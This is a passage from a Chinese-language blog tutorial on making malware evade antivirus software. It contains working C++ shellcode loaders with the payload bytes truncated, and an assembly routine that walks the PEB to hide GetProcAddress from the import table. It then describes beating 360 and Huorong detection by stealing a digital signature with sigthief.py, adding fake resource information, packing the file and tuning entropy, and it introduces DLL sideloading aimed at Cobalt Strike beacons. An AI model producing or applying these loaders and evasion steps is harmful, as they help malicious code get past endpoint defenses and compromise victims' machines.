myCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//RtlMoveMemory</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(WINAPI* vRtlMoveMemory)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN VOID UNALIGNED* Destination,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN CONST VOID UNALIGNED* Source,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T Length</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//WaitForSingleObject</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* dwWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE hHandle, <span class="comment">// handle to object</span></span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwMilliseconds <span class="comment">// time-out interval</span></span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 892 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//获取相关函数地址</span></span><br><span class="line">	myVirtualAlloc myVT = (myVirtualAlloc)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>));</span><br><span class="line">	myCreateThread myCT = (myCreateThread)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;CreateThread&quot;</span>));</span><br><span class="line">	vRtlMoveMemory mvMemory = (vRtlMoveMemory)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;RtlMoveMemory&quot;</span>));</span><br><span class="line">	dwWaitForSingleObject waitFSO = (dwWaitForSingleObject)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;WaitForSingleObject&quot;</span>)); </span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、申请内存</span></span><br><span class="line">	LPVOID addr = <span class="built_in">myVT</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、拷贝 shellcode 到内存</span></span><br><span class="line">	<span class="built_in">mvMemory</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、执行内存中的shellcode</span></span><br><span class="line">	<span class="comment">//创建线程执行</span></span><br><span class="line">	HANDLE hThread = <span class="built_in">myCT</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//等待线程运行</span></span><br><span class="line">	<span class="built_in">waitFSO</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">//关闭线程</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更隐蔽一些隐藏 GetProcAddress，这样导入表中就发现不了敏感 Windows API函数了。</p>
<p>首先新建项</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetInitializationOrderModuleList.<span class="keyword">asm</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250523095738676.png" alt="image-20250523095738676"></p>
<p>在 GetInitializationOrderModuleList.asm 中添加代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">GetInInitializationOrderModuleList PROC</span><br><span class="line">mov rax,gs:[60h] ; PEB，注意，这里不能写0x60</span><br><span class="line">mov rax,[rax+18h] ; PEB_LDR_DATA</span><br><span class="line">mov rax,[rax+30h] ; InInitializationOrderModuleList</span><br><span class="line">ret ; 这里不能写retn</span><br><span class="line">GetInInitializationOrderModuleList ENDP</span><br><span class="line">END </span><br></pre></td></tr></table></figure>

<p>编辑属性</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250523095937068.png" alt="image-20250523095937068"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250523100059747.png" alt="image-20250523100059747"></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令行：ml64 /<span class="title class_">Fo</span> <span class="variable">$(</span><span class="title class_">IntDir</span>)<span class="string">%(fileName)</span>.obj /c <span class="string">%(fileName)</span>.asm</span><br><span class="line">输出：<span class="variable">$(</span><span class="title class_">IntDir</span>)<span class="string">%(FileName)</span>.obj</span><br></pre></td></tr></table></figure>

<p>完整代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">// 不显示黑窗口</span></span></span><br><span class="line"><span class="comment">// UNICODE_STRING 结构体定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">	USHORT Length; <span class="comment">//表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节</span></span><br><span class="line">	USHORT MaximumLength; <span class="comment">//分配的内存空间的大小，以字节为单位</span></span><br><span class="line">	PWSTR Buffer; <span class="comment">//表示指向存储Unicode字符串的字符数组的指针</span></span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"><span class="comment">// 声明获取 InInitializationOrderModuleList 链表的函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID64 __stdcall <span class="title">GetInInitializationOrderModuleList</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 获取 Kernel32.dll 的基地址</span></span><br><span class="line"><span class="function">HMODULE <span class="title">getKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 获取 InInitializationOrderModuleList 链表</span></span><br><span class="line">	LIST_ENTRY* pNode = (LIST_ENTRY*)<span class="built_in">GetInInitializationOrderModuleList</span>();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="comment">// 获取 FullDllName 成员</span></span><br><span class="line">		UNICODE_STRING* FullDllName = (UNICODE_STRING*)((BYTE*)pNode + <span class="number">0x38</span>);</span><br><span class="line">		<span class="comment">// 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll</span></span><br><span class="line">		<span class="keyword">if</span> (*(FullDllName-&gt;Buffer + <span class="number">12</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">			<span class="comment">// 返回模块的基地址</span></span><br><span class="line">			<span class="keyword">return</span> (HMODULE)(*((ULONG64*)((BYTE*)pNode + <span class="number">0x10</span>)));</span><br><span class="line">		&#125;</span><br><span class="line">		pNode = pNode-&gt;Flink;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数的地址</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">getGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 获取 DOS 头</span></span><br><span class="line">	PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line">	<span class="comment">// 获取 NT 头</span></span><br><span class="line">	PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr +</span><br><span class="line">		baseAddr-&gt;e_lfanew);</span><br><span class="line">	<span class="comment">// 获取导出表</span></span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)</span><br><span class="line">		((LONG64)baseAddr + pImageNt -&gt; OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"><span class="comment">// 获取导出函数地址数组、导出函数名数组和导出函数序号数组</span></span><br><span class="line">PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir -&gt; AddressOfFunctions);</span><br><span class="line">PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class="line">PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir -&gt; AddressOfNameOrdinals);</span><br><span class="line"><span class="comment">// 遍历导出函数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">	<span class="comment">// 获取当前函数地址</span></span><br><span class="line">	LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr +</span><br><span class="line">		RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);</span><br><span class="line">	<span class="comment">// 获取当前函数名地址</span></span><br><span class="line">	PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class="line">	<span class="comment">// 如果当前函数名是 &quot;GetProcAddress&quot;，返回其地址</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span>*)FunctionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> F_va_Tmp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 定义包含 shellcode 的缓冲区</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> sc[] = <span class="string">&quot;\xe8\xa0\x03...&quot;</span>;</span><br><span class="line">	<span class="comment">// 获取 Kernel32.dll 的基地址和GetProcAddress函数地址</span></span><br><span class="line">	HMODULE hKernal32 = <span class="built_in">getKernel32Address</span>(); <span class="comment">// 获取Kernel32.dll的基地址</span></span><br><span class="line">	pGetProcAddress GetProcAddress = (pGetProcAddress)<span class="built_in">getGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数地址</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取其他所需API函数地址</span></span><br><span class="line">	pVirtualProtect VirtualProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32,</span><br><span class="line">		<span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">	pCreateThread CreateThread = (pCreateThread)<span class="built_in">GetProcAddress</span>(hKernal32,</span><br><span class="line">		<span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">	pWaitForSingleObject WaitForSingleObject =</span><br><span class="line">		(pWaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line">	<span class="comment">//修改shellcode缓冲区的内存保护属性，以便执行</span></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)sc, <span class="built_in">sizeof</span>(sc), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="comment">//创建新线程执行shellcode并等待其执行完成</span></span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)sc, <span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="编译器与PE文件处理"><a href="#编译器与PE文件处理" class="headerlink" title="编译器与PE文件处理"></a>编译器与PE文件处理</h3><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>做免杀时，会遇到shellcode加密了，加载器代码做了动态加载和优化，但是依然会被杀软报毒，所以要对exe进行一定处理。</p>
<p>1、编译参数</p>
<p>2、数字签名</p>
<p>3、详细的版本信息</p>
<p>可以通过控制变量法找到杀软的查杀点，进行定向免杀。</p>
<h5 id="MD和MT的区别"><a href="#MD和MT的区别" class="headerlink" title="MD和MT的区别"></a>MD和MT的区别</h5><p>MD (动态链接运行库)：程序自己不携带C运行库，借用系统里已经安装好的DLL文件，但是若目标机器中没有对应的DLL，程序将运行失败</p>
<p>MT (静态链接运行库)：程序携带C运行库，不依赖外部DLL，但是体积更大</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525093204867.png" alt="image-20250525093204867"></p>
<p>当MD杀的时候，尝试切换MT。</p>
<h5 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h5><p>使用不同的编译器免杀效果也不同</p>
<p>1、VS</p>
<p>2、gcc</p>
<p>3、Intel C++</p>
<h5 id="加数字签名"><a href="#加数字签名" class="headerlink" title="加数字签名"></a>加数字签名</h5><p>使用 sigthief.py脚本</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sigthief.<span class="keyword">py</span> -i <span class="number">360</span>.<span class="keyword">exe</span> -t shellcode.<span class="keyword">exe</span> -<span class="keyword">o</span> shellcode_sign.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525101045353.png" alt="image-20250525101045353"></p>
<p>加数字签名前：360查杀</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525101315732.png" alt="image-20250525101315732"></p>
<p>加数字签名后，过了360</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525101553301.png" alt="image-20250525101553301"></p>
<p>但是签名的确是伪造的</p>
<p><strong><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525102746455.png" alt="image-20250525102746455"></strong></p>
<p>当然也可以进行自签名。</p>
<h5 id="添加资源信息"><a href="#添加资源信息" class="headerlink" title="添加资源信息"></a>添加资源信息</h5><p>使用ResourceHakcer.exe工具</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525103617230.png" alt="image-20250525103617230"></p>
<p>添加资源信息前：</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525103458284.png"></p>
<p>添加资源文件后：</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525103739550.png" alt="image-20250525103739550"></p>
<p>但是只加上资源信息是过不了360的，所以最好数字签名和资源信息一块儿加上。</p>
<p>先添加资源文件，再添加数字签名，轻松过360</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525105744109.png" alt="image-20250525105744109"></p>
<h5 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h5><h6 id="upx加壳"><a href="#upx加壳" class="headerlink" title="upx加壳"></a>upx加壳</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upx</span> -<span class="number">1</span>~<span class="number">9</span> shellcode.exe</span><br></pre></td></tr></table></figure>

<p>经测试，upx -9 shellcode.exe过不了360，但是过火绒还是可以的。</p>
<h6 id="Shielden加壳"><a href="#Shielden加壳" class="headerlink" title="Shielden加壳"></a>Shielden加壳</h6><p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525145901941.png" alt="image-20250525145901941"></p>
<h6 id="vmp加壳"><a href="#vmp加壳" class="headerlink" title="vmp加壳"></a>vmp加壳</h6><p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525151107720.png" alt="image-20250525151107720"></p>
<h5 id="检查PE文件的熵值"><a href="#检查PE文件的熵值" class="headerlink" title="检查PE文件的熵值"></a>检查PE文件的熵值</h5><p>文件的熵值被用于衡量系统的混乱程度，熵值越大，说明混乱程度越高</p>
<p>熵值的大小也被用域检测PE文件病毒，一般合法软件的熵值在4.8 - 7.2之间</p>
<p>所以加壳后需要看一下文件熵值是否超过7.2</p>
<p>拿vmp加壳后的shellcode.vmp.exe为例</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525152224247.png" alt="image-20250525152224247"></p>
<p>明显高了，所以被360杀了也算正常了。</p>
<p>Shielden加壳PE文件的熵值在 7.66左右</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525152407441.png" alt="image-20250525152407441"></p>
<p>upx加壳1-9的范围在6.799~6.975之间</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525152825541.png" alt="image-20250525152825541"></p>
<h3 id="白加黑"><a href="#白加黑" class="headerlink" title="白加黑"></a>白加黑</h3><h5 id="白加黑概念"><a href="#白加黑概念" class="headerlink" title="白加黑概念"></a>白加黑概念</h5><p>白：带有有效数字签名的可执行文件，通常为exe文件</p>
<p>黑：恶意代码所在文件，通常为DLL</p>
<h6 id="什么是DLL文件"><a href="#什么是DLL文件" class="headerlink" title="什么是DLL文件"></a>什么是DLL文件</h6><p>DLL 中文全程叫做 动态链接库（Dynamic Link Library，简称 DLL）是一种 Windows 操作系统中的 共享文件，包含一系列可供程序共用的函数、数据和资源。DLL 文件中存放的是各类程序的函数实现过 程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，昀后进行调用。使用DLL文件的好 处是程序不需要在运行之初加载所有代码，只有在程序需要某个函数的时候才从 DLL 中取出。dll 文件 和 exe 文件一样都是 PE 文件</p>
<h6 id="上线原理"><a href="#上线原理" class="headerlink" title="上线原理"></a>上线原理</h6><p>白程序 -&gt; 黑DLL -&gt; DLLMain&#x2F;导出函数 -&gt; 执行shellcode加载器代码 -&gt; CS上线</p>
<h6 id="DLL文件结构"><a href="#DLL文件结构" class="headerlink" title="DLL文件结构"></a>DLL文件结构</h6><p>Visual Studio新建项目 - 动态链接库</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525161900389.png" alt="image-20250525161900389"></p>
<p>新建项目目录结构</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525162035438.png" alt="image-20250525162035438"></p>
<p><strong>(1) framework.h</strong></p>
<p>用于包含项目中需要使用的头文件，默认包含&lt;windows.h&gt;</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525162203565.png" alt="image-20250525162203565"></p>
<p><strong>(2) pch.h</strong></p>
<p>预编译标头文件，DLL的导出函数在此处定义</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525162452444.png" alt="image-20250525162452444"></p>
<p><strong>(3) dllmain.cpp</strong></p>
<p>包含程序的入口点，可以理解为入口函数，在dllmain.cpp中实现在pch.h中定义的函数，也可以在其他cpp文件中实现，比如pch.cpp等。</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525162631409.png" alt="image-20250525162631409"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//当DLL被进程加载时执行，每个进程只初始化一次</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:  <span class="comment">//当线程被创建时调用</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:  <span class="comment">//当线程结束时执行</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:  <span class="comment">//当DLL被进程卸载时执行</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">//DLL_PROCESS_ATTACH成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>(4) pch.cpp</strong></p>
<p>一般用于存放导出函数</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525162745813.png" alt="image-20250525162745813"></p>
<h6 id="编译一个DLL"><a href="#编译一个DLL" class="headerlink" title="编译一个DLL"></a>编译一个DLL</h6><p>pch.cpp中定义导出函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pch.cpp: 与预编译标头对应的源文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="comment">// 当使用预编译的头时，需要使用此源文件，编译才能成功。</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pch.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加要在此处预编译的标头</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> Dll1_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> API_DECLSPECKM _declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> API_DECLSPECKM _declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">API_DECLSPECKM <span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure>

<p>Ctrl + B生成DLL</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525164911727.png" alt="image-20250525164911727"></p>
<h6 id="查看DLL导出函数"><a href="#查看DLL导出函数" class="headerlink" title="查看DLL导出函数"></a>查看DLL导出函数</h6><p>Visual Studio 2022自带工具  Visual Studio 2022 Developer Command Prompt</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpbin /<span class="built_in">exports</span> E:<span class="string">\免杀\Dll1\x64\Release\Dll1.dll</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250525165939002.png" alt="image-20250525165939002"></p>
